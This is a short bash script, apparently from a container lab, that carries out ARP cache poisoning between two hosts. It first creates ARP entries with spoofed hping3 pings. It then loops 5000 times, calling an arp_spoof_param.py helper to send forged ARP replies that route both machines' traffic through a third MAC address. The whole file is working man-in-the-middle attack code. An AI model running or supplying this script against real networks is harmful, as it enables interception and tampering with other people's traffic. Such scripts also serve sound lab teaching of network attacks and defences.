#!/bin/bash
# create ARP entries between two target machines
hping3 -1 -c 1 -a 172.21.0.11 172.21.0.12
hping3 -1 -c 1 -a 172.21.0.12 172.21.0.11

# periodically keep poisoning ARP cache of two target machines
ii=0
while [ $ii -lt 5000 ];
do
  ./arp_spoof_param.py 172.21.0.11 "02:42:ac:15:00:0b" 172.21.0.12 "02:42:ac:15:00:0e"
  ./arp_spoof_param.py 172.21.0.12 "02:42:ac:15:00:0c" 172.21.0.11 "02:42:ac:15:00:0e"
	sleep 5
	ii=$(($ii + 1))
	echo $ii
done
